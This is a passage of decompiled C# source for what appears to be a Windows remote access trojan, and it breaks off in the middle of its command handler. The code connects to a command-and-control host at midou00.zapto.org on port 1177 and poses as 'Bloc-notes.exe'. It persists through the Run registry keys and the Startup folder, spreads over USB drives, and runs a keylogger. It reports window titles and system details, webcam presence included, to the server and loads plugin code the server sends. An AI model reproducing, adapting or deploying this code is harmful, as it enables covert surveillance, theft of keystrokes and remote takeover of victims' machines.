using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace w;

public class A
{
	public string VN;

	public string VR;

	public string MTX;

	public Mutex MT;

	public string EXE;

	public string DR;

	public string RG;

	public string H;

	public string P;

	public bool SPR;

	public string Y;

	public bool BD;

	public USB usb;

	public string SPL;

	public kl kq;

	public object LO;

	private object Pro;

	public bool Cn;

	public object C;

	private string sf;

	public object F;

	public A()
	{
		//IL_0513: Unknown result type (might be due to invalid IL or missing references)
		//IL_051d: Expected O, but got Unknown
		VN = "SGFjS2Vk";
		VR = new string(new char[6] { '0', '.', '5', '.', '0', 'E' });
		MTX = "";
		MT = null;
		EXE = "Bloc-notes.exe";
		DR = "AppData";
		RG = "90875d2a12174bfc72e61095963ba405";
		H = "midou00.zapto.org";
		P = "1177";
		SPR = Conversions.ToBoolean("True");
		Y = new string(new char[5] { '|', '\'', '|', '\'', '|' });
		BD = Conversions.ToBoolean("True");
		usb = new USB();
		SPL = new string(new char[7] { '[', 'e', 'n', 'd', 'o', 'f', ']' });
		kq = null;
		LO = new FileInfo(Application.get_ExecutablePath());
		Cn = false;
		C = null;
		sf = new string(new char[45]
		{
			'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M',
			'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
			'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
			'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
			'n', '\\', 'R', 'u', 'n'
		});
		F = (object)new Computer();
	}

	public void WL()
	{
		//IL_0424: Unknown result type (might be due to invalid IL or missing references)
		//IL_042e: Expected O, but got Unknown
		MTX = RG;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), new string(new char[1] { ':' }), -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, new string(new char[2] { 'U', 'P' }), false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "!" }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, "WaitForExit", new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, new string(new char[2] { '.', '.' }), false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		INS();
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (CompDir(new FileInfo(process.MainModule!.FileName), (FileInfo)LO) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(MTX);
			ProjectData.EndApp();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			MT = new Mutex(initiallyOwned: true, MTX);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		object obj = new Thread(RC, 1);
		NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		if (SPR)
		{
			usb.ExeName = RG + new string(new char[4] { '.', 'e', 'x', 'e' });
			usb.Start();
		}
		try
		{
			kq = new kl();
			obj = new Thread(kq.WRK, 1);
			NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		int num2 = 0;
		string text2 = "";
		if (BD)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					ED();
				});
				pr(1);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num++;
					num2++;
					if (num == 5)
					{
						try
						{
							EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							ProjectData.ClearProjectError();
						}
					}
					if (num > 10)
					{
						num = 0;
						if (Cn && Operators.CompareString(ACT(), text2, false) != 0)
						{
							text2 = ACT();
							if (text2 != null && text2.Length > 0)
							{
								Send(new string(new char[3] { 'a', 'c', 't' }) + Y + text2);
							}
						}
					}
					if (num2 <= 7)
					{
						continue;
					}
					num2 = 0;
					try
					{
						object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[2] { sf, true };
						object[] array3 = array2;
						bool[] array4 = new bool[2] { true, false };
						object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "OpenSubKey", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						object[] array5 = new object[2]
						{
							RG,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
						};
						object[] array6 = array5;
						bool[] array7 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj3, (Type)null, "SetValue", array6, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					try
					{
						object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array8 = new object[2] { sf, true };
						object[] array9 = array8;
						bool[] array7 = new bool[2] { true, false };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", array9, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						object[] array10 = new object[2]
						{
							RG,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
						};
						object[] array11 = array10;
						bool[] array4 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array11, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array10[0]), typeof(string));
						}
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void DLV(string n)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + RG }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[1] { n };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				n = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GTV(string n)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + RG }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { n, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				n = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object STV(string n, string t)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + RG }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { n, t };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				n = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				t = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string inf()
	{
		string text = new string(new char[2] { 'l', 'v' }) + Y;
		try
		{
			if (Operators.CompareString(GTV("vn"), "", false) == 0)
			{
				string text2 = text;
				string s = DEB(ref VN) + new string(new char[1] { '_' }) + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = GTV("vn");
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + new string(new char[2] { '?', '?' }) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + new string(new char[2] { '?', '?' }) + Y;
			ProjectData.ClearProjectError();
		}
		text = text + FR() + Y;
		try
		{
			text = text + Gcc(7u) + Y;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + new string(new char[1] { 'X' }) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Info", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OSFullName", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Microsoft", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Windows", "Win" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "®", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "™", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "  ", " " }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { " Win", "Win" }, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += new string(new char[2] { '?', '?' });
			ProjectData.ClearProjectError();
		}
		text += new string(new char[2] { 'S', 'P' });
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, new string(new char[1] { ' ' }), -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += new string(new char[1] { '0' });
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += new string(new char[1] { '0' });
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(new string(new char[3] { 'x', '8', '6' }))) ? (text + new string(new char[4] { ' ', 'x', '8', '6' }) + Y) : (text + new string(new char[4] { ' ', 'x', '6', '4' }) + Y));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + new string(new char[2] { 'N', 'o' }) + Y) : (text + new string(new char[3] { 'Y', 'e', 's' }) + Y));
		text = text + VR + Y;
		text = text + new string(new char[2] { '.', '.' }) + Y;
		text = text + ACT() + Y;
		string text5 = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[2]
				{
					new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + RG,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text6 = Conversions.ToString(enumerator.Current);
					if (text6.Length == 32)
					{
						text5 = text5 + text6 + new string(new char[1] { ',' });
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public string FR()
	{
		try
		{
			return ((FileInfo)LO).LastWriteTime.ToString(new string(new char[10] { 'y', 'y', 'y', 'y', '-', 'M', 'M', '-', 'd', 'd' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[7] { 'u', 'n', 'k', 'n', 'o', 'w', 'n' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string ENB(ref string s)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		return Convert.ToBase64String(bytes);
	}

	public string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	public string RN(int c)
	{
		VBMath.Randomize();
		Random random = new Random();
		string text = "";
		string text2 = new string(new char[26]
		{
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
			'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
			'u', 'v', 'w', 'x', 'y', 'z'
		});
		for (int i = 1; i <= c; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public byte[] SB(ref string S)
	{
		return Encoding.Default.GetBytes(S);
	}

	public string BS(ref byte[] B)
	{
		return Encoding.Default.GetString(B);
	}

	public Array fx(byte[] b, string spl)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(BS(ref b), spl, -1, (CompareMethod)0);
		object[] array2 = new object[3]
		{
			b,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, "Write", array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object[] array5 = checked(new object[3]
		{
			b,
			array[0].Length + spl.Length,
			b.Length - (array[0].Length + spl.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public byte[] ZIP(byte[] B, ref bool CM)
	{
		checked
		{
			object[] array5;
			bool[] array3;
			if (CM)
			{
				object obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				object[] array = new object[3] { B, 0, B.Length };
				object[] array2 = array;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					B = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				byte[] array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				array5 = new object[3] { array4, 0, array4.Length };
				object[] array6 = array5;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj, (Type)null, "Read", array6, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return array4;
			}
			object obj3 = new MemoryStream(B);
			object obj4 = new GZipStream((Stream)obj3, CompressionMode.Decompress);
			byte[] array7 = new byte[4];
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj3, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
			array5 = new object[3] { array7, 0, 4 };
			object[] array8 = array5;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj3, (Type)null, "Read", array8, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array7 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			int num = BitConverter.ToInt32(array7, 0);
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
			byte[] array9 = new byte[num - 1 + 1];
			array5 = new object[3] { array9, 0, num };
			object[] array10 = array5;
			array3 = new bool[3] { true, false, true };
			NewLateBinding.LateCall(obj4, (Type)null, "Read", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array9 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			if (array3[2])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(int));
			}
			NewLateBinding.LateCall(obj4, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array9;
		}
	}

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long hProcess);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public bool Cam()
	{
		checked
		{
			try
			{
				string lpszName = Strings.Space(100);
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

	public string Gcc(uint i)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = GetLocaleInfo(1024u, i, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return new string(new char[1] { 'X' });
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public string ACT()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string s = new string(new char[1] { ' ' });
					return ENB(ref s);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string WinTitle = Strings.StrDup(windowTextLengthA + 1, new string(new char[1] { '*' }));
				GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				if (lpdwProcessID != 0)
				{
					try
					{
						string s = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
						return ENB(ref s);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = ENB(ref WinTitle);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return ENB(ref WinTitle);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string s = new string(new char[1] { ' ' });
				string result = ENB(ref s);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	public string HWD()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[3] { 'E', 'R', 'R' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[STAThread]
	public static void main()
	{
		A a = new A();
		a.WL();
	}

	private void ED()
	{
		pr(0);
	}

	public object Plugin(byte[] ByteOfPlugin, string ClassName)
	{
		object obj = Assembly.Load(ByteOfPlugin);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), ",", -1, (CompareMethod)0)[0] + "." + ClassName }, (string[])null, (Type[])null, (bool[])null);
	}

	private void RS(object a, object e)
	{
		try
		{
			string text = new string(new char[2] { 'r', 's' });
			string y = Y;
			string s = Conversions.ToString(NewLateBinding.LateGet(e, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = ENB(ref s);
			NewLateBinding.LateSetComplex(e, (Type)null, "Data", new object[1] { s }, (string[])null, (Type[])null, true, false);
			Send(text + y + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ex()
	{
		try
		{
			Send(new string(new char[3] { 'r', 's', 'c' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Ind(byte[] b)
	{
		//IL_1573: Unknown result type (might be due to invalid IL or missing references)
		//IL_157a: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 's' }), false) == 0)
				{
					try
					{
						NewLateBinding.LateCall(Pro, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					Pro = new Process();
